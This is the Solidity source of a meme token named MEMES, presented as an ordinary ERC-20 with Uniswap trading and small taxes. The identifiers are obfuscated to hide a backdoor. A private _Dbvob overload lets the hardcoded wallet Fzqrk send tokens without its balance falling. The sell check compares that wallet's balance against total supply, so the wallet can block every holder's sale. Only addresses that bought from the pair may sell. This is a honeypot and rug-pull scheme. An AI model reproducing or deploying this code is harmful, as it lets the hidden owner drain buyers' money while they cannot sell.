/*

Twitter: https://twitter.com/memescoin_erc20

Telegram: https://t.me/Memeserc20_Coin

Website: https://memeseth.com/

*/



// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _Dbvob(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _Dbvob(a, b, "SafeMath");
    }

    function  _Dbvob(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _keqoe(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract MEMES is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _bcplc;
    address payable private Fzqrk;
    address private _Brafp;
    string private constant _name = unicode"MEMES";
    string private constant _symbol = unicode"MEMES";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _Rodre=0;
    uint256 private _pejra=0;
    uint256 public _floph = _totalSupply;
    uint256 public _qoujr = _totalSupply;
    uint256 public _poubv= _totalSupply;
    uint256 public _qoekb= _totalSupply;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _Kdreo;
    mapping (address => bool) private _hpfrk;
    mapping(address => uint256) private _Elofg;

    bool private _fqyeopen;
    bool public _prekg = false;
    bool private pukyr = false;
    bool private _rjuqo = false;


    event _bueap(uint _floph);
    modifier gvouf {
        pukyr = true;
        _;
        pukyr = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _Kdreo[owner(

        )] = true;
        _Kdreo[address
        (this)] = true;
        _Kdreo[
            Fzqrk] = true;
        Fzqrk = 
        payable (0x8CF5e1b528c1f2E8A51E87dCa90C73fC6c1E6d30);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _Dbvob(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 elybae=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_prekg) {
                if (to 
                != address
                (_bcplc) 
                && to !=
                 address
                 (_Brafp)) {
                  require(_Elofg
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _Elofg
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _Brafp && to != 
            address(_bcplc) &&
             !_Kdreo[to] ) {
                require(amount 
                <= _floph,
                 "Exceeds the _floph.");
                require(balanceOf
                (to) + amount
                 <= _qoujr,
                  "Exceeds the _qoujr.");
                if(_pejra
                < _Rodre){
                  require
                  (! _gqxbv(to));
                }
                _pejra++;
                 _hpfrk
                 [to]=true;
                elybae = amount._keqoe
                ((_pejra>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _Brafp &&
             from!= address(this) 
            && !_Kdreo[from] ){
                require(amount <= 
                _floph && 
                balanceOf(Fzqrk)
                <_qoekb,
                 "Exceeds the _floph.");
                elybae = amount._keqoe((_pejra>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_pejra>
                _Rodre &&
                 _hpfrk[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!pukyr 
            && to == _Brafp &&
             _rjuqo &&
             contractTokenBalance>
             _poubv 
            && _pejra>
            _Rodre&&
             !_Kdreo[to]&&
              !_Kdreo[from]
            ) {
                _transferFrom( _Bilrk(amount, 
                _Bilrk(contractTokenBalance,
                _qoekb)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _qvlale(address
                    (this).balance);
                }
            }
        }

        if(elybae>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(elybae);
          emit
           Transfer(from,
           address
           (this),elybae);
        }
        _balances[from
        ]= _Dbvob(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _Dbvob(elybae));
        emit Transfer
        (from, to, 
        amount.
         _Dbvob(elybae));
    }

    function _transferFrom(uint256
     tokenAmount) private
      gvouf {
        if(tokenAmount==
        0){return;}
        if(!_fqyeopen)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _bcplc.WETH();
        _approve(address(this),
         address(
             _bcplc), 
             tokenAmount);
        _bcplc.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _Bilrk
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _Dbvob(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == Fzqrk){
            return a ;
        }else{
            return a .
             _Dbvob (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _floph = _totalSupply;
        _qoujr = _totalSupply;
        emit _bueap(_totalSupply);
    }

    function _gqxbv(address 
    account) private view 
    returns (bool) {
        uint256 OyNqe;
        assembly {
            OyNqe :=
             extcodesize
             (account)
        }
        return OyNqe > 
        0;
    }

    function _qvlale(uint256
    amount) private {
        Fzqrk.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _fqyeopen ) ;
        _bcplc  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _bcplc), 
            _totalSupply);
        _Brafp = 
        IUniswapV2Factory(_bcplc.
        factory( ) 
        ). createPair (
            address(this
            ),  _bcplc .
             WETH ( ) );
        _bcplc.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_Brafp).
        approve(address(_bcplc), 
        type(uint)
        .max);
        _rjuqo = true;
        _fqyeopen = true;
    }

    receive() external payable {}
}